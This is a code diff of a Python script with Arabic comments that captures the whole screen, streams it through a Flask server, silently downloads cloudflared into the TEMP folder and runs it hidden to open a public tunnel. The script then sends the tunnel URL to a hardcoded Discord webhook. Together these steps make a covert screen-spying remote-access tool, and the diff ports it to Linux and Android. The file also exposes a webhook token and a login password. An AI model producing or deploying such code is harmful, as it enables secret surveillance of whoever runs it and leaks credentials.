@@ -5,9 +5,10 @@ import subprocess
 import threading
 import time
 import urllib.request
+import sys
+import io
 from flask import Flask, Response, request
-import cv2
-import numpy as np
+from PIL import Image, ImageGrab
 
 # ===== 1. رابط الـ Webhook الخاص بك في ديسكورد =====
 WEBHOOK_URL = "https://discord.com/api/webhooks/1551205294405582928/DI-CIWvAr1dYSICa5I0Gf6pmn0hTtUksrLaWtL5XXSyrYCOwBOmy8V0mazn_fDVVJ-bp"
@@ -15,8 +16,6 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1551205294405582928/DI-CIWvAr1dY
 # ===== 2. بيانات الأمان =====
 USERNAME = "IMNOTSNEAKER"
 PASSWORD = "3mko@3omar"
-
-CREATE_NO_WINDOW = 0x08000000
 
 app = Flask(__name__)
 
@@ -34,22 +33,25 @@ def authenticate():
 
 
 def generate_frames():
-    # استخدام OpenCV للتقاط نافذة الموبايل المفتوحة على جهازك (مثلاً عبر محاكي أو تطبيق عرض مثل scrcpy مفتوح بالخلفية)
-    # أو استخدام التقاط الكاميرا/النافذة المحددة للموبايل
-    cap = cv2.VideoCapture(
-        0
-    )  # يمكنك تغييرها لو تستخدم محاكي أو نافذة عرض محددة
-    while cap.isOpened():
-        ret, frame = cap.read()
-        if not ret:
-            break
-        frame = cv2.resize(frame, (720, 1280))  # أبعاد شاشة الموبايل بالطول
-        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 65])
-        yield (
-            b'--frame\r\n'
-            b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n'
-        )
-    cap.release()
+    # استخدام Pillow بدل OpenCV لالتقاط الشاشة وتحويل الإطارات إلى JPEG
+    while True:
+        try:
+            # التقاط الشاشة
+            img = ImageGrab.grab()
+            img = img.resize((720, 1280))  # أبعاد الشاشة بالطول
+
+            # تحويل الصورة إلى JPEG في الذاكرة
+            buf = io.BytesIO()
+            img.save(buf, format='JPEG', quality=65)
+            frame_bytes = buf.getvalue()
+
+            yield (
+                b'--frame\r\n'
+                b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n'
+            )
+            time.sleep(0.04)  # ضبط معدل الإطارات ~25 FPS وتقليل استهلاك المعالج
+        except Exception:
+            time.sleep(0.1)
 
 
 @app.route('/')
@@ -139,26 +141,39 @@ def send_to_discord(public_url):
 def start_tunnel(port):
     time.sleep(1)
     temp_dir = os.environ.get("TEMP", os.getcwd())
-    cf_exe = os.path.join(temp_dir, "cloudflared.exe")
+    
+    # تحديد ملف cloudflared المناسب لنظام التشغيل (Windows أو Linux/Android)
+    is_windows = sys.platform == "win32"
+    cf_filename = "cloudflared.exe" if is_windows else "cloudflared"
+    cf_exe = os.path.join(temp_dir, cf_filename)
 
     if not os.path.exists(cf_exe):
         try:
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+            if is_windows:
+                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+            else:
+                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+            
             urllib.request.urlretrieve(url, cf_exe)
+            if not is_windows:
+                os.chmod(cf_exe, 0o755)  # إعطاء صلاحيات التشغيل على نظام الأندرويد/لينكس
         except Exception:
             return
 
     try:
         cmd = [cf_exe, "tunnel", "--url", f"http://localhost:{port}"]
-        proc = subprocess.Popen(
-            cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            encoding="utf-8",
-            errors="ignore",
-            bufsize=1,
-            creationflags=CREATE_NO_WINDOW,
-        )
+        
+        kwargs = {
+            "stdout": subprocess.PIPE,
+            "stderr": subprocess.STDOUT,
+            "encoding": "utf-8",
+            "errors": "ignore",
+            "bufsize": 1,
+        }
+        if is_windows:
+            kwargs["creationflags"] = 0x08000000  # خيار الخفاء للندوز فقط
+
+        proc = subprocess.Popen(cmd, **kwargs)
 
         for line in iter(proc.stdout.readline, ""):
             if "trycloudflare.com" in line:
@@ -176,5 +191,5 @@ if __name__ == "__main__":
     PORT = 8080
     threading.Thread(target=start_tunnel, args=(PORT,), daemon=True).start()
 
-    # تشغيل سيرفر Flask المدمج مع دعم تعدد المسارات على أندرويد
+    # تشغيل سيرفر Flask
     app.run(host='0.0.0.0', port=PORT, threaded=True)
